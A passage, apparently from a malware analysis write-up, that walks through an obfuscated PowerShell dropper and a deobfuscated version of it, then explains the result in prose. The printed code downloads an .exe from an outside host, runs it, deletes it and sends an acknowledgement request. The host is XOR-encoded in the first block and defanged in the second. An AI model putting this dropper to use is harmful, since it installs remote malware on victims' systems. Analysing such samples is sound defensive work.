$wc=New-Object ('Ne'+'t.WebClient')
$ok=0
for($i=0;$i -lt 3 -and !$ok; $i++)
{
  try{
    [IO.File]::$n2281($tf,$wc.$n546e($u39201))
    if([IO.File]::Exists($tf)){
      $ok=1
    }
    else
    {
      Start-Sleep 2
    }
  }
  catch{
    Start-Sleep 2
  }
}
if(![IO.File]::Exists($tf))
{
  exit
}
Start-Process -FilePath $tf
try{
  Start-Sleep 5
  [IO.File]::Delete($tf)}catch{}
  $u6d5d6=-join(@(120,100,100,96,42,63,63,99,102,99,61,102,117,98,121,118,121,115,113,100,121,127,126,116,113,100,117,62,114,117,117,98,63,40,35,36,40,113,117,114,35,115,113,35,34,40,33,117,32,47,113,115,123,45,33)|%{[char]($_-bxor16)})
  $n6659='DownloadStri'+'ng'
try{
  [void]$wc.$n6659($u6d5d6)
}
catch{}

```
Further deobfuscating shows
```PowerShell
$downloadDataString='Dow'+'nloadData'
$writeAllBytesString='Write'+'AllBytes'
$timesEightVariable=0
$sqrtValue=0
while($timesEightVariable -lt 307527)
{
  $sqrtValue+=[math]::Sqrt($timesEightVariable*8)
  ++$timesEightVariable
}
$downloadFile='hxxp[:]//svs-verificationdate[.]beer/37027e701747c94f3a5623633aac52462dbd663fa428368ea2085cf6391b4721' #Defanged URL
$temporaryDirectory=[IO.Path]::Combine([IO.Path]::GetTempPath(),[IO.Path]::GetRandomFileName())
[IO.Directory]::CreateDirectory($temporaryDirectory)|Out-Null
$temporaryFile=[IO.Path]::Combine($temporaryDirectory,[IO.Path]::GetRandomFileName()+'.exe')
$webClient=New-Object ('Net.WebClient')
$ok=0
for($i=0;$i -lt 3 -and !$ok; $i++)
{
  try{
    [IO.File]::$writeAllBytesString($temporaryFile,$webClient.$downloadDataString($downloadFile))
    if([IO.File]::Exists($temporaryFile)){
      $ok=1
    }
    else
    {
      Start-Sleep 2
    }
  }
  catch{
    Start-Sleep 2
  }
}
if(![IO.File]::Exists($temporaryFile))
{
  exit
}
Start-Process -FilePath $temporaryFile
try{
  Start-Sleep 5
  [IO.File]::Delete($temporaryFile)
}
catch{}
$ackURL='hxxp[:]//svs-verificationdate[.]beer/8348aeb3ca3281e0?ack=1'
$downloadString='DownloadString'
try{
  [void]$webClient.$downloadString($ackURL)
}
catch{}
```
Analysing this, there seems to be a time wasting / mathematic operation loop to square root multiples of 8 and add them up.
After this, it creates a temporary directory and .exe file and tries to download the value of `hxxp[:]//svs-verificationdate[.]beer/37027e701747c94f3a5623633aac52462dbd663fa428368ea2085cf6391b4721` to the new temp file. If it downloads, it tries starting the process. Once it does that, it sleeps for 5s, deletes the new temp file and then calls out to `hxxp[:]//svs-verificationdate[.]beer/8348aeb3ca3281e0?ack=1`
